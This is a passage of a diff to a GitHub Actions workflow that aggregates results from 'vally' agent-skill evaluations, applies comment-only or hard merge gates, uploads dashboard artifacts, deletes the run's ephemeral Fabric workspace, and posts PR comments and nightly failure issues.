+          # single failure; normalise to an array so the JS consumer always
+          # gets a list.
+          if ($failureArr.Count -eq 1) { $failureJson = "[$failureJson]" }
+          $failureB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($failureJson))
+          "failure-set-b64=$failureB64" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+
+
+          $scopeNote = if ($env:VALLY_BASELINE -eq 'true') {
+              '(BASELINE -- no skills loaded, informational only)'
+          } elseif ($env:GITHUB_EVENT_NAME -eq 'schedule') {
+              '(nightly, full suite)'
+          } elseif ($env:GITHUB_EVENT_NAME -eq 'workflow_dispatch') {
+              '(manual, full suite)'
+          } elseif ([string]::IsNullOrWhiteSpace($env:VALLY_MATCHED_EVAL_DIRS) -or $env:VALLY_MATCHED_EVAL_DIRS -eq 'ALL') {
+              '(PR scope: full suite)'
+          } else {
+              "(PR scope: $env:VALLY_MATCHED_EVAL_DIRS)"
+          }
+          $sumLines = Format-VallySummary -Aggregate $agg -ScopeNote $scopeNote
+          ($sumLines -join "`n") | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Append -Encoding utf8
+
+          # Emit the dashboard schema artifact BEFORE the gating exits so a
+          # failing summarise still publishes the run to the dashboard
+          # (the dashboard's value increases when failing runs are visible,
+          # not less). The upload-artifact step below uses if: always() so
+          # an exit 1 here still ships the files. Producer-side Evidence
+          # redaction (GUIDs, bearer tokens, tenant= query strings,
+          # 500-char cap) happens inside Export-VallySchemaArtifact so the
+          # in-run job summary above keeps full evidence for the PR
+          # author while the public-facing dashboard surface is scrubbed.
+          $schemaOut = "$env:GITHUB_WORKSPACE/vally-schema-out"
+          New-Item -ItemType Directory -Path $schemaOut -Force | Out-Null
+          $deepLinks = $null
+          try {
+              $deepLinks = Get-VallyDeepLinks -RepoSlug $env:GITHUB_REPOSITORY -RunId $env:GITHUB_RUN_ID -RunAttempt $env:GITHUB_RUN_ATTEMPT
+          } catch {
+              Write-Host "::warning::Get-VallyDeepLinks failed: $($_.Exception.Message). Emitting schema artifact without deep links (renderer degrades silently)."
+          }
+          $runIdAttempt = "$env:GITHUB_RUN_ID-$env:GITHUB_RUN_ATTEMPT"
+          $emit = Export-VallySchemaArtifact -Aggregate $agg -DeepLinks $deepLinks -OutputRoot $schemaOut -RunId $runIdAttempt
+          Write-Host "::notice::Wrote $($emit.WrittenFiles.Count) schema file(s) across $($emit.SkillCount) skill(s) / $($emit.StimCount) stim(s) under $schemaOut."
+
+          if ($agg.Total -eq 0) {
+              # Distinguish "ran but every result was empty/unparseable" from
+              # "vally output format changed so even the Loaded lines are gone".
+              # If results.jsonl is missing AND no shard log has a parseable
+              # "Loaded N stimul" line, the most likely cause is a vally format
+              # drift -- surface that explicitly so a reader does not chase
+              # workspace/auth red herrings.
+              if ($agg.LoadedLineCount -eq 0) {
+                  Write-Error "vally output format may have changed; results unparseable: total==0, no parseable 'Loaded N stimul' lines in any shard's vally-run.log, and no results.jsonl. See the vally-format-drift TODO in Classify-VallyExit.ps1."
+                  exit 1
+              }
+              Write-Error "No vally trial results were produced across any shard (results.jsonl empty or missing AND no parseable scores in vally-run.log fallback). Treating as a harness-wide failure rather than a green 0/0 outcome."
+              exit 1
+          }
+          # Note on parse-error handling: a future iteration may add
+          # $agg.ParseErrors / $agg.ParseErrorLines into Get-VallyAggregate
+          # to surface "results.jsonl tail-truncated by EBUSY race" as a
+          # ::warning::. The fatal case ($agg.Total -eq 0 due to a
+          # whole-results.jsonl loss) is already caught at line ~966
+          # above, so the missing parse-error warning is informational
+          # only and not a correctness gate.
+          # Per-skill trial-failure warnings AND per-skill grader-fail counts
+          # surface BEFORE the merge gate fires so they remain visible in the
+          # Actions UI checks panel even when summarise red-fails. Without
+          # this ordering the Write-Error gate would exit the step before
+          # the per-skill breakdown writes a single ::warning::, leaving
+          # reviewers with only a top-line "15 failed" with no skill-name
+          # breakdown until they open the job summary tab.
+          if ($env:VALLY_BASELINE -eq 'true') {
+              Write-Host "::notice::Baseline mode (no Fabric skills loaded). Many graders below are expected to fail -- this run is the WITHOUT-skills comparison datapoint. Compare to a normal (skills-loaded) run from the same commit to compute per-stim skill ROI."
+          }
+          if ($agg.Failed -gt 0 -and $env:VALLY_BASELINE -ne 'true') {
+              # ::warning:: (not ::notice::) so the per-skill trial-failure
+              # surfaces in the Actions UI checks panel. ::notice:: lives only
+              # in the run log and is invisible to PR-page reviewers.
+              #
+              # Suppressed in baseline mode: every "failure" there is expected
+              # (the baseline notice above explains why) so emitting ~20
+              # actionable-looking yellow annotations on a manual baseline
+              # dispatch run would be noise.
+              foreach ($k in ($agg.PerEval.Keys | Sort-Object)) {
+                  if ($agg.PerEval[$k].Failed -gt 0) {
+                      Write-Host "::warning::$($k): $($agg.PerEval[$k].Failed) of $($agg.PerEval[$k].Total) trial(s) had gradeResult.passed=false."
+                  }
+              }
+              Write-Host "::warning::$($agg.Failed) of $($agg.Total) vally trial(s) had gradeResult.passed=false. The harness ran cleanly; see the per-skill breakdown in the job summary for human review."
+          }
+
+          # Merge gate: count a stim as failed if ANY grader (across ANY trial)
+          # failed. Uses GatingStimFailed (one row per distinct stim, runs>1
+          # collapses to one row), NOT StimFail (per-trial binary count). The
+          # gating semantic matches main's pre-extraction inline behavior:
+          # silent regressions where eval-aggregate score still clears
+          # threshold but a stim's deterministic grader failed must red-fail.
+          # Skipped in baseline mode: a baseline run rewrites environment.skills
+          # to [] so the agent runs WITHOUT Fabric skills, meaning most
+          # skill-invocation / output-matches graders are EXPECTED to fail.
+          # Without the baseline guard the gate fires on every baseline run
+          # and contradicts the four "baseline failures are informational"
+          # callouts at L90, L882, L1099, L1162.
+          #
+          # Calibration-window toggle (VALLY_GATE_ON_STIM_FAIL, default false):
+          # while false, a stim failure is surfaced as a ::warning:: + the PR
+          # sticky comment (post-comment job) but does NOT exit 1. This mirrors
+          # Gate B's VALLY_FAIL_ON_REGRESSION switch and resolves the cutover
+          # catch-22 (the PR's own run is red on the new gate with no way to
+          # suppress it). Flip to 'true' once stims are driven green.
+          if ($agg.GatingStimFailed -gt 0 -and $env:VALLY_BASELINE -ne 'true') {
+              if ($env:VALLY_GATE_ON_STIM_FAIL -eq 'true') {
+                  Write-Error "$($agg.GatingStimFailed) of $($agg.GatingStimTotal) vally stimulus run(s) had at least one grader fail (any layer, any trial). See the Grader failures table in the job summary for the per-grader rows + evidence."
+                  exit 1
+              } else {
+                  Write-Host "::warning::CALIBRATION WINDOW (VALLY_GATE_ON_STIM_FAIL!=true): $($agg.GatingStimFailed) of $($agg.GatingStimTotal) vally stimulus run(s) had at least one grader fail. Gate A is comment-only and is NOT blocking this run. See the PR sticky comment for the failure-set breakdown by root cause; flip VALLY_GATE_ON_STIM_FAIL=true once calibration is complete to make this a hard gate."
+              }
+          }
+
+          # Fail-on-regression posture: when enabled, treat per-trial failures
+          # (already surfaced as ::warning:: above) as a workflow failure.
+          # Default false during the calibration window so PRs are not blocked
+          # while workload teams tune per-eval budgets and add L1+L2 graders.
+          if ($agg.Failed -gt 0 -and $env:VALLY_BASELINE -ne 'true' -and $env:VALLY_FAIL_ON_REGRESSION -eq 'true') {
+              Write-Error "fail-on-regression=true: $($agg.Failed) of $($agg.Total) trial(s) had gradeResult.passed=false; failing the workflow."
+              exit 1
+          }
+          exit 0
+
+      # -----------------------------------------------------------------
+      # Upload the dashboard schema artifact. Distinct -vally- suffix in
+      # the artifact name so a consumer can filter to vally output only
+      # via gh run download --pattern, while still matching the
+      # dashboard-build.yml startswith("smoke-results-schema-") filter
+      # that picks up both legacy and vally producers automatically.
+      # retention-days: 60 matches the dashboard's 60-day fetch_horizon
+      # (dashboard-build.yml: window_days * 2 = 60), so the daily-recompute
+      # backstop never loses days at the tail of the window.
+      # if: always() so a gating-failed summarise still publishes the
+      # artifact (the dashboard's diagnostic value is highest on the
+      # failing runs). if-no-files-found: error gates the upload on the
+      # emitter actually writing something, so a regression that silently
+      # produces zero files surfaces as a workflow failure rather than as
+      # a missing dashboard row.
+      # -----------------------------------------------------------------
+      - name: Upload vally dashboard schema artifact
+        # No hashFiles() guard: if-no-files-found: error below is the
+        # regression gate. A hashFiles() pre-check would skip the upload
+        # step silently on zero-files, defeating the gate.
+        if: always()
+        uses: actions/upload-artifact@v7
+        with:
+          name: smoke-results-schema-vally-${{ github.run_id }}-${{ github.run_attempt }}
+          path: ./vally-schema-out
+          retention-days: 60
+          if-no-files-found: error
+
+      # -----------------------------------------------------------------
+      # Cleanup the SHARED ephemeral workspace once every shard has
+      # finished and the artifacts have been aggregated. Runs `if: always()`
+      # so a failed shard, a summarisation error, or a download miss does
+      # not leak the workspace. Cleanup failure is logged as a warning but
+      # does not fail the job: a leaked workspace is reaped by the daily
+      # cron in fabric-cleanup-stale-workspaces.yml within 24h, whereas a
+      # false-red summarise would mask the real eval signal.
+      # In particular, Gate A's `exit 1` (the merge gate above) aborts the
+      # summarise STEP, not this step -- `if: always()` is what guarantees a
+      # Gate-A-red run still deletes the workspace. KEEP this guard if you
+      # refactor the step: dropping it would leak one ephemeral workspace per
+      # red PR during the calibration window (when ~all PRs trip Gate A) until
+      # the daily cron reaps it.
+      # -----------------------------------------------------------------
+      - name: Cleanup shared ephemeral workspace
+        if: always() && needs.setup.outputs.workspace-id != ''
+        shell: pwsh
+        env:
+          WORKSPACE_ID: ${{ needs.setup.outputs.workspace-id }}
+          WORKSPACE_NAME: ${{ needs.setup.outputs.workspace-name }}
+        run: |
+          $wsId = ($env:WORKSPACE_ID ?? "").Trim()
+          $wsName = ($env:WORKSPACE_NAME ?? "").Trim()
+          if (-not $wsId) {
+              Write-Host "::notice::No WORKSPACE_ID propagated from setup; nothing to clean up."
+              exit 0
+          }
+          $tenantDomain = ($env:TENANT_DOMAIN ?? "").Trim()
+          $spAppId      = ($env:SP_APP_ID ?? "").Trim()
+          $spCertPath   = ($env:SP_CERT_PATH ?? "").Trim()
+          if (-not $tenantDomain -or -not $spAppId -or -not $spCertPath -or -not (Test-Path $spCertPath)) {
+              Write-Warning "Auth env vars missing or SP cert PEM not present; skipping cleanup. Daily cron sweep will reap workspace '$wsName' within 24h."
+              exit 0
+          }
+          # az login as the SP so the access-token request below resolves to
+          # the same identity that owns Contributor on the shared workspace.
+          # Phase B's azure/login@v2 in the composite established UAMI context;
+          # we still need SP context here to act against Fabric.
+          az login --service-principal --tenant $tenantDomain --username $spAppId --certificate $spCertPath --allow-no-subscriptions | Out-Null
+          if ($LASTEXITCODE -ne 0) {
+              Write-Warning "az login --service-principal failed (LASTEXITCODE=$LASTEXITCODE); skipping cleanup. Daily cron sweep will reap workspace '$wsName' within 24h."
+              exit 0
+          }
+          $token = $(az account get-access-token --resource https://api.fabric.microsoft.com --query accessToken -o tsv 2>$null)
+          if (-not $token) {
+              Write-Warning "Could not acquire Fabric token; skipping cleanup. Daily cron sweep will reap workspace '$wsName' within 24h."
+              exit 0
+          }
+          Write-Host "Deleting shared ephemeral workspace: $wsName"
+          try {
+              # DELETE /v1/workspaces/<id>. setup outputs supplied the id
+              # directly, so we do not need to paginate the workspace list to
+              # resolve a displayName -> id mapping like the legacy per-shard
+              # cleanup did.
+              $delUrl = "https://api.fabric.microsoft.com/v1/workspaces/$wsId"
+              Invoke-RestMethod -Uri $delUrl -Method Delete -Headers @{ Authorization = "Bearer $token" } -ErrorAction Stop
+              Write-Host "::notice::Deleted shared workspace '$wsName'"
+          } catch {
+              # 404 means the workspace is already gone -- benign race when
+              # the daily cron sweep happened to fire mid-run, or a previous
+              # manual cleanup deleted it. Surface that distinctly from real
+              # failures so triage doesn't chase a non-issue. Any other
+              # status code (5xx, network) gets the generic warning, and the
+              # daily cron reaps anything that genuinely leaked.
+              $status = $null
+              try { $status = [int]$_.Exception.Response.StatusCode } catch { }
+              if ($status -eq 404) {
+                  Write-Host "::notice::Workspace '$wsName' already gone (HTTP 404, benign race)"
+              } else {
+                  Write-Warning "Workspace cleanup failed for '$wsName': $($_.Exception.Message). Daily cron sweep will reap it within 24h."
+              }
+          }
+
+  # -----------------------------------------------------------------
+  # post-comment: post ONE NEW PR comment per run with the Vally failure set
+  # grouped by root-cause class. New-per-run (not a sticky) is deliberate while
+  # the suite is being stabilised: it leaves a chronological history on the
+  # conversation tab. Runs on pull_request only, if: always() so a comment-only
+  # Gate A run (or a hard-red gating run) still surfaces the failure set. This
+  # is the signal the reviewer reads during the calibration window when Gate A
+  # is comment-only (VALLY_GATE_ON_STIM_FAIL=false) and summarise exits 0.
+  #
+  # Skipped when summarise itself was skipped/cancelled (e.g. a draft PR where
+  # detect -> shard -> summarise all skip, or a user cancel): there is no eval
+  # data to report, so posting a comment would be noise. A summarise FAILURE is
+  # NOT skipped here: a hard Gate A exit 1 emits the failure set BEFORE exiting,
+  # so the comment renders the gating failure breakdown; a genuine crash (no
+  # results) renders a did-not-complete headline.
+  #
+  # Render logic lives in .github/scripts/vally-pr-comment.js so it is pure +
+  # unit-tested (tests/test_vally_pr_comment.js). This job only decodes the
+  # failure set and posts the comment.
+  # -----------------------------------------------------------------
+  post-comment:
+    needs: [setup, detect, shard, summarise]
+    if: >-
+      always() && github.event_name == 'pull_request'
+      && needs.summarise.result != 'skipped'
+      && needs.summarise.result != 'cancelled'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pull-requests: write
+    steps:
+      # Checkout the PR head so the helper (new in this PR, not yet on the base
+      # branch) is present for require(). This workflow triggers on
+      # `pull_request` (NOT pull_request_target), so it already runs PR-authored
+      # code throughout (eval.yaml, tests/vally-ci/*.ps1); loading the PR's
+      # helper here adds no new trust boundary, and on a fork PR the token is
+      # read-only so the post below simply no-ops. Pinned to head.sha (not
+      # head.ref) to defend against a TOCTOU branch race-swap.
+      - name: Checkout PR head for helper script
+        uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+          sparse-checkout: |
+            .github/scripts/vally-pr-comment.js
+          sparse-checkout-cone-mode: false
+
+      - name: Post Vally PR comment
+        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+          STIM_TOTAL: ${{ needs.summarise.outputs.total-count }}
+          GATING_STIM_TOTAL: ${{ needs.summarise.outputs.gating-stim-total }}
+          GATING_STIM_FAILED: ${{ needs.summarise.outputs.gating-stim-failed }}
+          GATE_MODE: ${{ needs.summarise.outputs.gate-mode }}
+          FAILURE_SET_B64: ${{ needs.summarise.outputs.failure-set-b64 }}
+          SUMMARISE_RESULT: ${{ needs.summarise.result }}
+        with:
+          script: |
+            const fs = require('fs');
+            const path = require('path');
+            const scriptPath = path.resolve(process.env.GITHUB_WORKSPACE, '.github', 'scripts', 'vally-pr-comment.js');
+            // Defensive: if a future refactor moves the helper, no-op rather
+            // than red-fail this job with MODULE_NOT_FOUND.
+            if (!fs.existsSync(scriptPath)) {
+              core.notice('vally-pr-comment.js not present in checkout; skipping comment.');
+              return;
+            }
+            const { buildBody } = require(scriptPath);
+
+            const prNumber = parseInt(process.env.PR_NUMBER, 10);
+            if (!Number.isInteger(prNumber)) {
+              core.notice('No PR number resolved; skipping comment.');
+              return;
+            }
+
+            // A hard Gate A failure emits the failure set BEFORE exit 1, so a
+            // non-empty FAILURE_SET_B64 can coexist with summariseResult
+            // 'failure'. A genuine crash leaves it empty.
+            let failures = [];
+            const b64 = process.env.FAILURE_SET_B64 || '';
+            if (b64) {
+              try {
+                failures = JSON.parse(Buffer.from(b64, 'base64').toString('utf-8'));
+              } catch (e) {
+                core.warning(`Could not decode failure-set-b64: ${e.message}`);
+              }
+            }
+
+            const body = buildBody({
+              runUrl: process.env.RUN_URL || '',
+              stimTotal: parseInt(process.env.STIM_TOTAL, 10) || 0,
+              gatingStimTotal: parseInt(process.env.GATING_STIM_TOTAL, 10) || 0,
+              gatingStimFailed: parseInt(process.env.GATING_STIM_FAILED, 10) || 0,
+              gateMode: process.env.GATE_MODE === 'gating' ? 'gating' : 'comment-only',
+              summariseResult: process.env.SUMMARISE_RESULT || 'success',
+              failures,
+            });
+
+            const created = await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: prNumber,
+              body,
+            }).catch((e) => {
+              // This job is informational and non-gating (the merge gate is the
+              // summarise job). Do not red-fail it on a transient API error or a
+              // fork-PR read-only token (createComment 403); surface a warning
+              // and let the run stay green. The failure set is still in the job
+              // summary regardless.
+              core.warning(`Could not post Vally PR comment: ${e.message}`);
+              return null;
+            });
+            if (created) {
+              core.notice(`Posted Vally comment #${created.data.id}`);
+            }
+
+  # -----------------------------------------------------------------
+  # nightly-alert: issue-only notification for scheduled failures.
+  # Teams/webhook routing is intentionally left out until recipient and
+  # throttling policy are agreed; a labeled GitHub issue is durable and cheap.
+  # -----------------------------------------------------------------
+  nightly-alert:
+    needs: [setup, detect, shard, summarise]
+    if: >-
+      always() && github.event_name == 'schedule' &&
+      (needs.setup.result == 'failure' ||
+       needs.shard.result == 'failure' ||
+       needs.summarise.result == 'failure')
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+      issues: write
+    steps:
+      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+        with:
+          ref: ${{ github.sha }}
+
+      - name: Download shard artifacts for issue body
+        shell: bash
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          artifact_dir="alert-artifacts"
+          mkdir -p "$artifact_dir"
+          err_file="$artifact_dir/gh-run-download.err"
+          # Alerting must still create an issue when artifacts are missing
+          # (for example, setup failed before upload), so handle this failure
+          # explicitly instead of hiding it with a blanket fallback.
+          set +e
+          gh run download "$GITHUB_RUN_ID" \
+            --repo "$GITHUB_REPOSITORY" \
+            --pattern "vally-smoke-results-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}-shard*" \
+            --dir "$artifact_dir" \
+            2>"$err_file"
+          status=$?
+          set -e
+          if [ "$status" -ne 0 ]; then
+            echo "::warning::Could not download shard artifacts (exit ${status}); alert will include job metadata and any available files."
+            sed 's/^/  /' "$err_file"
+          fi
+
+      - name: Open or update nightly failure issue
+        shell: bash
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          SETUP_RESULT: ${{ needs.setup.result }}
+          DETECT_RESULT: ${{ needs.detect.result }}
+          SHARD_RESULT: ${{ needs.shard.result }}
+          SUMMARISE_RESULT: ${{ needs.summarise.result }}
+        run: |
+          set -euo pipefail
+          python .github/scripts/vally_nightly_alert.py \
+            --artifacts-dir "alert-artifacts" \
+            --label "nightly-vally-fail"
